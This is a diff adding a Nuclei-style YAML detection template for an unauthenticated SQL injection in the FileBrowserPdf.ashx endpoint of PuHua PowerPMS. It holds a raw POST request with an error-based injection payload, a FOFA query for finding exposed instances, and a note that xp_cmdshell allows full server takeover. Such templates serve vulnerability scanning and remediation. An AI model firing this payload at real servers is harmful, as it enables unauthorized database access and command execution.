@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"success","false","nvarchar")
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          _fileid=1'and db_name()>0 --
+id: PuHua-PowerPMS-FileBrowserPdf-SqlInjection
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="普华科技-PowerPMS"
+        普华 PowerPMS FileBrowserPdf.ashx 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+    name: 普华 PowerPMS FileBrowserPdf.ashx SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 普华科技
